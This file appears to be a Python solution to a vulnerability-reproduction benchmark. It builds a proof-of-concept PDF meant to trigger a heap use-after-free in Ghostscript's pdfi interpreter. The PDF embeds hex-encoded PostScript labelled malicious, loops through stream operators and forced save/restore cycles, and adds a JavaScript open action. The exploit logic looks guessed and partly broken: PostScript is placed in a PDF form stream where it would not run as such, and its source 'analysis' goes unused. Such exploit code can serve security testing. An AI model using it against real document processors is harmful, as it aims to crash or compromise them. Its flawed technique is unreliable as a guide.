import os
import tarfile
import tempfile
import subprocess
import sys
import re
from pathlib import Path
from typing import Optional, List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (assuming single top-level dir)
            extracted = os.listdir(tmpdir)
            if len(extracted) == 1:
                root = os.path.join(tmpdir, extracted[0])
            else:
                root = tmpdir
            
            # Analyze source to understand vulnerability better
            vuln_info = self._analyze_source(root)
            
            # Generate PoC based on analysis
            poc = self._generate_poc(vuln_info)
            
            return poc
    
    def _analyze_source(self, root_dir: str) -> dict:
        """Analyze source code to understand vulnerability patterns."""
        info = {
            'vulnerable_operators': [],
            'postscript_operators': [],
            'stream_functions': []
        }
        
        # Search for relevant patterns in C source files
        c_files = []
        for ext in ('*.c', '*.cpp', '*.cc', '*.h', '*.hpp'):
            c_files.extend(Path(root_dir).rglob(ext))
        
        for c_file in c_files[:100]:  # Limit for performance
            try:
                with open(c_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for pdfi context usage
                    if 'pdfi' in content and 'stream' in content:
                        # Look for operators that access stream
                        if 'currentfile' in content or 'run' in content:
                            info['postscript_operators'].append(str(c_file))
                        
                        # Look for stream access functions
                        stream_patterns = [
                            r'pdfi_stream_[a-z_]+',
                            r'gs_[a-z_]*stream[a-z_]*',
                            r'access.*stream',
                            r'use.*stream'
                        ]
                        for pattern in stream_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            info['stream_functions'].extend(matches)
            except:
                continue
        
        # Common vulnerable operators based on description
        info['vulnerable_operators'] = [
            'currentfile', 'run', 'exec', 'execform',
            'read', 'readline', 'readstring', 'token',
            'file', 'closefile', 'flushfile'
        ]
        
        return info
    
    def _generate_poc(self, vuln_info: dict) -> bytes:
        """Generate PoC PDF that triggers heap use-after-free."""
        
        # Create a PDF with PostScript code that:
        # 1. Creates a pdfi context without stream
        # 2. Attempts to set input stream from PostScript (and fails)
        # 3. Accesses the stream through vulnerable operators
        
        # PDF structure:
        # - Header
        # - Catalog with embedded PostScript
        # - Stream with malicious PostScript code
        # - Trailer
        
        # Malicious PostScript code designed to trigger the vulnerability
        postscript_code = """%!PS
        /pdfdict 10 dict def
        pdfdict begin
        /pdfemptycontext true def
        
        % Attempt to set input stream (will fail in vulnerable version)
        /setstreamfailed false def
        {
            (nonexistentfile) (r) file dup
            /PDFInputFile exch def
            /setstreamfailed true def
        } stopped {
            pop pop
        } if
        
        % Now try to use the stream even though set failed
        % This should trigger use-after-free
        /trycount 0 def
        {
            trycount 1 add /trycount exch def
            trycount 5 gt { exit } if
            
            % Try various operators that might access the stream
            currentfile
            PDFInputFile
            dup where {
                pop
                dup /run get exec
                dup /read get exec
                dup /readline get exec
                dup /token get exec
                dup /closefile get exec
                pop
            } {
                pop
            } ifelse
            
            % Force garbage collection to trigger UAF
            save restore
            
        } loop
        
        % Additional attempts with different operators
        <</DataSource currentfile>> /run get exec
        <</DataSource PDFInputFile>> /run get exec
        
        % Create circular references to complicate memory management
        /circular [circular] def
        circular 0 circular put
        
        % End with showpage to ensure rendering attempt
        showpage
        end
        """
        
        # Compress the PostScript code
        compressed = postscript_code.encode('utf-8')
        
        # Build PDF with the PostScript code embedded
        pdf_parts = []
        
        # PDF Header
        pdf_parts.append(b'%PDF-1.7\n')
        
        # Object 1: Catalog
        catalog = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
"""
        pdf_parts.append(catalog)
        
        # Object 2: Pages
        pages = b"""2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
"""
        pdf_parts.append(pages)
        
        # Object 3: JavaScript action to trigger quickly
        js_action = b"""3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (app.alert\\(\\"Triggering\\"\\);)
>>
endobj
"""
        pdf_parts.append(js_action)
        
        # Object 4: Page with embedded PostScript
        page = b"""4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/XObject << /Fm0 6 0 R >>
>>
>>
endobj
"""
        pdf_parts.append(page)
        
        # Object 5: Content stream
        content = b"""5 0 obj
<< /Length 50 >>
stream
q
612 0 0 792 0 0 cm
/Fm0 Do
Q
endstream
endobj
"""
        pdf_parts.append(content)
        
        # Object 6: Form XObject with malicious PostScript
        form_obj = b"""6 0 obj
<<
/Type /XObject
/Subtype /Form
/FormType 1
/BBox [0 0 612 792]
/Matrix [1 0 0 1 0 0]
/Length %d
/Filter /ASCIIHexDecode
>>
stream
%s
endstream
endobj
""" % (len(compressed) * 2, compressed.hex().encode())
        pdf_parts.append(form_obj)
        
        # Cross-reference table
        xref_start = len(b''.join(pdf_parts))
        xref = [b'xref\n0 7\n0000000000 65535 f\n']
        
        # Calculate offsets for each object
        offset = 0
        offsets = []
        for part in pdf_parts:
            offsets.append(offset)
            offset += len(part)
        
        # Add xref entries (skip 0)
        for i in range(1, 7):
            xref.append(b'%010d 00000 n\n' % offsets[i])
        
        pdf_parts.extend(xref)
        
        # Trailer
        trailer = b"""trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
%d
%%%%EOF
""" % xref_start
        pdf_parts.append(trailer)
        
        return b''.join(pdf_parts)
